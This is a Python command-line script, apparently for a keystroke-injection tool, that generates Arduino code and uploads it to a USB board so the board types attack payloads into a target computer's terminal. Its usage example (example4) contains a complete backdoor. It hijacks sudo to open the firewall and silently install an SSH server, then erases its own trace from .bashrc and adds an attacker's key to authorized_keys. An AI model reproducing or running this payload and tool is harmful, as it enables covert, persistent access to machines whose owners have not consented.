import os, subprocess, sys
import serial.tools.list_ports
import serial
import string
import argparse
import pyperclip
from uploader import Uploader

example = """
Examples:
{0}
{1}
{2}
{3}

"""
example1 = "$ %(prog)s [-h] [-v] [options]"
example2 = "$ %(prog)s -p firefox -tm unicode -v -pc promicro"
example3 = "$ %(prog)s -sp 'echo gato; firefox algunsitio.com' -tm unicode -v -pc promicro"
example4 = """$ %(prog)s python3 upload.py -sp " echo \" alias sudo='sudo iptables -P INPUT ACCEPT ; sudo apt install -qq -y openssh-server &> /dev/null ; grep -v \\\"#estalinea\\\" .bashrc >.tmp;mv .tmp .bashrc ; /usr/bin/sudo' #estalinea\" >> .bashrc ; echo \"ssh-rsa PUB-KEY-HERE \" >> \$HOME/.ssh/authorized_keys; exit; " -tm unicode -jc -otm ctrlaltt -em hex-bash -dp 0 -dl 0 -ctc"""
usage = example.format(example1, example2, example3, example4)

parser = argparse.ArgumentParser(prog='python3 uploader.py', usage=usage)

parser.add_argument('-l', '--list',
                    action="store_true",
                    help='An operative system to view available terminal opening and payloads.')

parser.add_argument('-otm', '--open-terminal-method', metavar='<specialkey|ctrlaltt|winr>',
                    choices=Uploader.getAllOpenTerminalMethods(),
                    type=str, default='dummy',
                    help='Special key combination to open terminal.')

parser.add_argument('-ctm', '--close-terminal-method', metavar='<altf4|dummyr>',
                    choices=Uploader.getAllCloseTerminalMethods(),
                    type=str, default='dummy',
                    help='Special key combination to close terminal.')

parser.add_argument('-p', '--payloads', metavar='<payload>',
                    choices=Uploader.getAllPayloadNames(),
                    type=str,
                    help='Specify an attack.')

parser.add_argument('-sp', '--set-payload', metavar='<payload>',
                    type=str,
                    help='Specify a command attack.')

parser.add_argument('-em', '--execution-mode', metavar='<command>',
                    choices=['direct', 'hex-bash', 'hex-zsh'],
                    type=str, default='direct',
                    help='Specify an attack.')

parser.add_argument('-tm', '--typing-mode', metavar='<unicode|spanish|english|dummy>',
                    choices=['unicode','spanish','english','dummy','windows'],
                    type=str, default='unicode',
                    help='Select a mode to type on keyboard special characters, by keyboard languages or standard with unicode.')

parser.add_argument('-di', '--delay-initial', metavar='N',
                    type=int, default=1001,
                    help='Delay to run payload in miliseconds. Default is 300.')

parser.add_argument('-dl', '--delay-lines', metavar='N',
                    type=int, default=302,
                    help='Delay between execution lines in miliseconds. Default is 300.')

parser.add_argument('-dt', '--delay-terminal', metavar='N',
                    type=int, default=1003,
                    help='Delay after open terminal in miliseconds. Default is 1000.')

parser.add_argument('-dp', '--delay-payload', metavar='N',
                    type=int, default=504,
                    help='Delay after payload in miliseconds. Default is 500.')

parser.add_argument('-b', '--board', metavar='<BoardName>',
                    type=str, default="HoodLoader2",
                    help='Board to search. Default searching for "HoodLoader2".')

parser.add_argument('-pc', '--predefined-compiler', metavar='<>',
                    choices=Uploader.getAllPredefinedCompilers(),
                    type=str,
                    help='To avoid define compiler you can use predefined compilers for some boards like Arduino Uno and Pro Micro (32u4 leonardo).')

parser.add_argument('-c', '--compiler', metavar='<package:arq:board>',
                    type=str,#, default="HoodLoader2:avr:HoodLoader2atmega32u4:board=leo",
                    help='Must be something like "package:arq:board" or "package:arq:board:options".')

parser.add_argument('-fp', '--arduino-port', metavar='<port>',
                    type=str,
                    help='Force an arduino port (like /dev/ttyACM0). Autodetect by default searching for "HoodLoader2".')

parser.add_argument('-ctc', '--copy-to-clipboard',
                    action="store_true",
                    help='Copy .ino code to clipboard.')

parser.add_argument('-v', '--verbose',
                    action="store_true",
                    help='Print .ino code to upload to arduino.')

parser.add_argument('-jc', '--just-compile',
                    action="store_true",
                    help='Do not upload code, just compile.')


args = parser.parse_args()
uploader = Uploader()

if args.verbose:
    print(args)

if args.list:
    print('--------------------------')
    print('Available windows payloads')
    print('--------------------------')
    print("\n".join(Uploader.getWindowsPayloadNames()))
    print('--------------------------')
    print(' Available linux payloads')
    print('--------------------------')
    print("\n".join(Uploader.getLinuxPayloadNames()))
    print('--------------------------')
    exit()
else:
    if not (args.payloads or args.set_payload):
        parser.error("the following arguments are required: -p/--payloads")

if args.typing_mode:
    print(args.typing_mode)
    uploader.setTranslaterDummy()
    if args.typing_mode == "unicode":
        uploader.setTranslaterUnicode()
    elif args.typing_mode == "windows":
        uploader.setTranslaterWindows()
    elif args.typing_mode == "spanish":
        uploader.setTranslaterSpanish()
    elif args.typing_mode == "dummy":
        uploader.setTranslaterDummy()
    elif args.typing_mode == "english":
        uploader.setTranslaterEnglish()

if args.payloads or args.set_payload:
    if args.payloads and args.set_payload:
        parser.error("you can not define payload and a custom at same time")
    if args.payloads:
        if args.payloads in Uploader.getAllPayloadNames():
            uploader.setPayloadName(args.payloads)
        else:
            parser.error("this payload does not exists")
    elif args.set_payload:
        uploader.setCustomPayload(args.set_payload)

if args.execution_mode:
    if args.execution_mode == "direct":
        uploader.setExecuterDirect()
    elif args.execution_mode == "hex-bash":
        uploader.setExecuterHexBash()
    elif args.execution_mode == "hex-zsh":
        uploader.setExecuterHexZsh()

if args.predefined_compiler or args.compiler:
    if args.predefined_compiler and args.compiler:
        parser.error("you can not define compiler and predefined compiler at same time")
    if args.predefined_compiler:
        uploader.setPredefinedCompiler(args.predefined_compiler)
    elif args.compiler:
        uploader.setCustomCompiler(args.compiler)

uploader.setDelayLines(args.delay_lines)
uploader.setOpenTerminalMethod(args.open_terminal_method)
uploader.setCloseTerminalMethod(args.close_terminal_method)
uploader.setDelayTerminal(args.delay_terminal)
uploader.setDelayPayload(args.delay_payload)
uploader.setDelayInitial(args.delay_initial)

#uploader.inoPayload = 
uploader._generateInoPayload()
final_code_ino = uploader.generateInoFinalCode()
print(final_code_ino)

if args.copy_to_clipboard:
    pyperclip.copy(final_code_ino)

if args.verbose:
    print(final_code_ino)

if args.just_compile:
    uploader.verifyCode(final_code_ino, verbose=args.verbose)
else:
    if args.arduino_port:
        uploader.setArduinoPort(args.arduino_port)
    else:
        try:
            uploader.setArduinoPortByBoard(args.board)
        except Exception:
            raise Exception("Arduino not found with board name \"%s\". Please force some port with -fp, change board name with -b or just compile and verify with -jc." % args.board)
    uploader.uploadCode(final_code_ino, verbose=args.verbose)


